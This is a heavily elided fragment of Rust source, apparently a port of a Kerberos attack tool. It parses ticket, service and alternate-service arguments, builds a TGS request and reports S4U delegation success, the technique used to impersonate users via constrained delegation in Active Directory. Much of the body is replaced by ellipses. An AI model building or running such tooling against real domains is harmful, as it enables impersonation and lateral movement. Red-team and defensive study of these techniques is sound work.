...
//! - `/tgs:BASE64` - S4U2Self ticket for S4U2Proxy
//! - `/altservice:SPN` - Alternate service name for ticket rewriting
...
fn main(args: *mut u8, len: usize) {
    ...
    if len == 0 { eprintln!("[X] /ticket:BASE64 /service:SPN required"); return; }
    ...
    let service = match get_param(&params, "/service:") { Some(s) => s, None => { eprintln!("[X] /service:SPN must be supplied!"); return; } };
    ...
    let tgs_req = match build_tgs_req(&api, &kirbi, service, &kirbi.realm) {
        Some(r) => r,
    ...
    match handle_tgs_rep(&api, &response, &kirbi) {
        Some(ticket) => {
            println!("[+] S4U request successful!");
